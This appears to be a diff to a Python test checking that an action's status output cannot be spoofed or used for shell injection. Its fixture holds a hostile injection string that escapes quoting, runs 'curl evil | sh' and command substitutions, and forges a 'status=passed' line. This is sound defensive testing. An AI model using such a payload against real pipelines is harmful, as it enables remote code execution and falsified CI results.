@@ -198,7 +198,7 @@ def test_action_status_output_cannot_be_spoofed_or_inject_shell(tmp_path):
     assert _read_result(tmp_path, passed, "0")["status"] == "passed"
     # a report committed in the PR claims "passed", but the run itself exited 2 (config error)
     assert _read_result(tmp_path, passed, "2")["status"] == "error"
-    hostile = {"status": "inconclusive", "summary": {"passed": 0, "failed": 1},
+    hostile = {"status": "inconclusive", "summary": {"passed": 0, "failed": 1}, "checks": [{"name": "a", "passed": False}],
                "inconclusive_reason": "r1: x\"; curl evil | sh; echo \"$(id)`id`'\nstatus=passed"}
     out = _read_result(tmp_path, hostile, "3")
     assert out["status"] == "inconclusive"
